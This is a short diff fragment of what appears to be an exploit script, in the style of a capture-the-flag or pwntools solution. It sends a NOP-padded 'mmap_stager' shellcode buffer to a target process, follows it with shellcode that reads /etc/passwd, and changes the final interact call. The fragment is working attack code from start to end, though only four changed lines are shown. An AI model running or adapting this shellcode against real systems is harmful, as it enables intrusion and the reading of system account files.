@@ -20,4 +20,4 @@ buf += sc.nopfill('mmap_stager', 200, buf)
 
 p.write(buf)
 p.write(sc.cat('/etc/passwd'))
-p.interact()
+p.interact(shell=False)
